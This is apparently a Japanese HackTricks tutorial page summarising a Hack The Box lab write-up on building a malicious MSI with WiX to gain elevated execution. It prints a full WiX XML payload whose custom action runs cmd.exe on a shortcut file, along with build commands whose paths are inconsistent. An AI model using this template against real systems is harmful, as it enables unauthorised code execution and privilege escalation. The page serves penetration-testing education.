# Malicious MSI の作成と Root の取得

{{#include ../../banners/hacktricks-training.md}}

MSI installer の作成には wixtools を使用します。具体的には [wixtools](http://wixtoolset.org) を利用します。代替の MSI builder も試みましたが、このケースでは成功しなかった点に注意してください。<sup>[[1]](#references)</sup>

wix MSI の使用例を詳しく理解するには、[このページ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)を参照することをお勧めします。ここでは、wix MSI の使用方法を示すさまざまな例を確認できます。<sup>[[2]](#references)</sup>

目的は、lnk file を実行する MSI を生成することです。これを実現するには、次の XML code を使用できます（[xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)）。<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Package element には、installer のバージョンを指定する InstallerVersion や、package が圧縮されているかどうかを示す Compressed などの attributes が含まれている点に注意が必要です。

作成プロセスでは、wixtools の tool である candle.exe を使用して、msi.xml から wixobject を生成します。次の command を実行してください:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
さらに、投稿にはコマンドとその出力を示す画像が掲載されていることにも触れておく価値があります。視覚的な参考として参照できます。<sup>[[1]](#references)</sup>

さらに、wixtools の別の tool である light.exe を使用して、wixobject から MSI ファイルを作成します。実行するコマンドは次のとおりです。<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
前の command と同様に、command とその出力を説明する画像が post に含まれています。<sup>[[1]](#references)</sup>

この summary は有益な情報を提供することを目的としていますが、より包括的な詳細と正確な手順については、original post を参照することを推奨します。<sup>[[1]](#references)</sup>

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
